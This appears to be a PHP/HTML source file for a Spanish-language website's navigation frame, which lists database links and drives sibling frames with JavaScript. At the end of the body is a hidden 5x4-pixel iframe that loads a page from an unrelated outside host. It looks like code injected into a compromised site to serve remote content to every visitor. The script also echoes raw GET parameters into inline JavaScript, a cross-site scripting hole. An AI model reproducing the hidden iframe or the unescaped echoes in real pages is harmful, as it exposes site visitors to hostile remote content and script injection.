<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];

if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }

$db->select('links_id','*','1=1');

?>
<HTML>
<HEAD><TITLE>areas</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
<?
if(isset($_GET['actualiza'])){ 
	echo "var actualiza=".$_GET['actualiza'].";\n"; 
	echo "var tit='".$_GET['tit']."'\n"; 
	echo "var sec='".$_GET['sec']."'\n"; 
}
?>

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}
function xhola(s,x,t){
	cierratodo();
	cambiar(s,x,t);
}
function cambiarsub(item,cod,t) {
	parent.frames['centro'].location='<?=CFG_virtualPath?>carga_contenido.php?id_sel='+cod+'&tit='+t
	parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=3&menu=1&id_sub_sel='+cod;

}
function cambiar(item,cod,t) {
	if(item){
	   obj=document.getElementById(item);
	   visible=(obj.style.display!="none")
	   key=document.getElementById("x" + item);
	   if (visible) {
	     obj.style.display="none";
	   } else {
	      obj.style.display="block";
	   }
	}
	if(cod>0){
		//'+cod+'
		parent.frames['centro'].location='<?=CFG_virtualPath?>carga_contenido.php?id_sel='+cod+'&tit='+t
		parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=3&menu=1&id_sub_sel='+cod;
	}
}
function cambiarlink(x,t){
		parent.frames['centro'].location='<?=CFG_virtualPath?>links.php?actualiza='+x+'&tit='+t;
		//centro = document.frames.item('iframearea').document.frames.item('centro');
		//centro.location='./links.php?actualiza='+x+'&tit='+t;
}

function abretodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="block";
     key=document.getElementById("x" + divs[i].id);
     key.innerHTML="<img src='textfolder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
   }
}

function cierratodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="none";
     //key=document.getElementById("x" + divs[i].id);
     //key.innerHTML="<img src='folder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
   }
}

</script>
<style type="text/css">
<!--
.fondito {
	background-image: url(../images/fondo.jpg);
	background-repeat: no-repeat;
	background-position: left top;
}
-->
</style>
</HEAD>
<BODY class="fondito">

<input type="hidden" name="id" value="3">
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"  height="19"><small>&nbsp;</small></a></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td >

<?
while($row=$db->fetch_object()){
?>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xuno" href="javascript:cierratodo();cambiarlink(<?=$row->id?>,'<?=$row->$lng?>');"><?=$row->$lng?></a></td>
  </tr>
</table>
<? } ?>




</td></tr></table>

<script>
parent.document.all('marcos').cols="200,*,<?=$anchof?>"
parent.frames['centro'].location='../carga_contenido.php?id_sel=200&tit=<?=traducemenu(200)?>';
parent.frames['derecha'].location='../carga_derecha.php?id_sel=200&menu=0';
try{
	if(actualiza>0){
		xhola(sec,actualiza,tit);
	}
}
catch(f){}


</script>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>

<?
function traducemenu($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->titulo;
	}
	else{
		echo "no hay datos";
	}

}
?>
